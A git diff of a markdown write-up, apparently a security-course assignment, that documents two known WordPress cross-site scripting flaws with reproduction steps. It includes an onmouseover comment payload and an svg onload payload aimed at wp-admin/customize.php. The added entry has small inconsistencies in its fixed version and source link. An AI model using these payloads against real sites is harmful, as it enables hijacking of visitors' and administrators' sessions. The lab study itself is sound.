@@ -36,13 +36,26 @@ Legacy Theme Preview XSS
   - [ ] GIF Walkthrough: <img src="https://i.imgur.com/dwgnDan.gif" width="800">
   - [ ] Steps to recreate: 
   
-    1.Comment on a post with this comment ```<a href='/wp-admin/' title=""             style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(23)//'>Test</a>```
+    Comment on a post with this comment ```<a href='/wp-admin/' title=""             style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(23)//'>Test</a>```
   
-  2. post comment
+  post comment
   
-  3. alert 23 will show
+  alert 23 will show
   - [ ] Affected source code:
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
+  
+  Cross Site Scripting
+  - [ ] Summary: Cross-site scripting (XSS) vulnerabilities in wp-includes/class-wp-theme.php in WordPress before 4.4.1 allow remote attackers to inject arbitrary web script or HTML via a (1) stylesheet name or (2) template name to wp-admin/customize.php.
+    - XSS
+    - Tested in version: 4.2.2
+    - Fixed in version: 4.4.2
+  - [ ] GIF Walkthrough: ![](https://i.imgur.com/tUCPLSZ.gif)
+  - [ ] Steps to recreate: Go to any post 
+  Post ```http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(40)>```
+  Alert 40 will pop up.
+
+  - [ ] Affected source code: https://github.com/WordPress/WordPress/blob/4.2-branch/wp-login.php
+  
 
 ## Assets
 
